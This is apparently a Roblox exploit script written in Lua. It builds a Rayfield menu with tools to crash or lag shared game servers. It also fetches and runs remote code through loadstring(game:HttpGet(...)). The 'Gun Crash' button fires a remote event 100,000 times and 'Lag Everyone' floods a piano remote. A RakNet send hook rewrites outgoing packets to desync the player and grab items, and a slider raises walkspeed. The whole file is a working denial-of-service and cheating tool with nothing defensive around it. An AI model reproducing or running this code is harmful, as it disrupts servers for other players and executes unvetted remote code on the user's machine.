local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local plr = Players.LocalPlayer

local pianoRemote = game:GetService("Workspace"):FindFirstChild("GlobalPianoConnector")
if not pianoRemote then
    Rayfield:Notify({
        Title = "Error!",
        Content = "Piano remote not found! Either patched or you didn't join the right game.",
        Duration = 10,
        Image = nil,
    })
end

_G.crash = false
_G.rakhook = nil

local Window = Rayfield:CreateWindow({
    Name = "⚡ Crash this bih",
    Icon = 0,
    LoadingTitle = "GUI Initializing...",
    LoadingSubtitle = "NIO",
    Theme = "DarkBlue",
})

local CrashTab = Window:CreateTab("Crash", 4483362458)
local LagTab = Window:CreateTab("Lag", 4483362458)
local MiscTab = Window:CreateTab("Misc", 4483362458)

CrashTab:CreateSection("💥 Crash Controls")

CrashTab:CreateButton({
    Name = "Gun Crash",
    Callback = function()
        local character = plr.Character or plr.CharacterAdded:Wait()
        local backpack = plr:WaitForChild("Backpack")

        local firstTool = backpack:FindFirstChildOfClass("Tool")

        if firstTool then
            firstTool.Parent = character
        end

        task.wait(0.5)

        local remote = game:GetService("Players").LocalPlayer
            .Character:WaitForChild("\217\129\217\132\217\136\216\179 \217\132\217\138\216\168\217\138\216\167\216\170")
            :WaitForChild("RemoteEvent")

        for i = 1, 100000 do
            remote:FireServer()
        end
    end,
})

LagTab:CreateSection("⚠ Lag Controls")

local Crasher = LagTab:CreateToggle({
    Name = "Lag Everyone",
    CurrentValue = false,
    Callback = function(Value)
        _G.crash = Value
        if Value then
            if plr.Character.Humanoid.Sit then
                Rayfield:Notify({
                    Title = "Enabled!",
                    Content = "The server will get laggier and people will freeze!",
                    Duration = 5,
                    Image = nil,
                })
            else
                Rayfield:Notify({
                    Title = "Error!",
                    Content = "You must sit behind a piano to use this!",
                    Duration = 2.5,
                    Image = nil,
                })
                return
            end
            while _G.crash do
                for i = 1, 61 do
                    pianoRemote:FireServer("play", i)
                end
                task.wait()
            end
            pianoRemote:FireServer("abort")
            Rayfield:Notify({
                Title = "Disabled!",
                Content = "Hope you had fun using it ;)",
                Duration = 2.5,
                Image = nil,
            })
        end
    end,
})

MiscTab:CreateSection("🔧 Miscellaneous")

MiscTab:CreateButton({
    Name = "Gloves",
    Callback = function()
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
        local StarterGui = game:GetService("StarterGui")

        local originalPosition = humanoidRootPart.Position

        pcall(function()
            StarterGui:SetCore("SendNotification", {
                Title = "Gloves";
                Text = "Teleporting...";
                Duration = 2;
            })
        end)

        humanoidRootPart.CFrame = CFrame.new(Vector3.new(-502.56, 9.90, 277.64))

        task.wait(1)

        pcall(function()
            StarterGui:SetCore("SendNotification", {
                Title = "RakNet Status";
                Text = "Hook: ENABLED ✅";
                Duration = 2;
            })
        end)

        _G.rakhook = function(packet)
            if packet.PacketId == 0x1B then
                local data = packet.AsBuffer
                buffer.writeu32(data, 1, 0xFFFFFFFF)
                packet:SetData(data)
            end
        end

        raknet.add_send_hook(_G.rakhook)

        task.wait(0.5)

        humanoidRootPart.CFrame = CFrame.new(originalPosition)

        task.wait(0.5)

        pcall(function()
            StarterGui:SetCore("SendNotification", {
                Title = "Gloves";
                Text = "Teleported back with gloves!";
                Duration = 2;
            })
        end)
    end,
})

MiscTab:CreateButton({
    Name = "Refresh",
    Callback = function()
        local StarterGui = game:GetService("StarterGui")

        if _G.rakhook then
            raknet.remove_send_hook(_G.rakhook)
            _G.rakhook = nil
        end

        pcall(function()
            StarterGui:SetCore("SendNotification", {
                Title = "RakNet Status";
                Text = "Hook: DISABLED ❌";
                Duration = 2;
            })
        end)
    end,
})

local Desync = MiscTab:CreateToggle({
    Name = "Desync",
    CurrentValue = false,
    Callback = function(Value)
        local StarterGui = game:GetService("StarterGui")

        local function notify(title, text)
            pcall(function()
                StarterGui:SetCore("SendNotification", {
                    Title = title;
                    Text = text;
                    Duration = 2;
                })
            end)
        end

        local function rakhook(packet)
            if packet.PacketId == 0x1B then
                local data = packet.AsBuffer
                buffer.writeu32(data, 1, 0xFFFFFFFF)
                packet:SetData(data)
            end
        end

        if Value then
            notify("RakNet Status", "Hook: ENABLED ✅")
            raknet.add_send_hook(rakhook)
        else
            notify("RakNet Status", "Hook: DISABLED ❌")
            raknet.remove_send_hook(rakhook)
        end
    end,
})

local Slider = MiscTab:CreateSlider({
    Name = "Walkspeed",
    Range = {16, 160},
    Increment = 1,
    Suffix = "",
    CurrentValue = 16,
    Flag = "Walkspeed",
    Callback = function(Value)
        plr.Character.Humanoid.WalkSpeed = Value
    end,
})
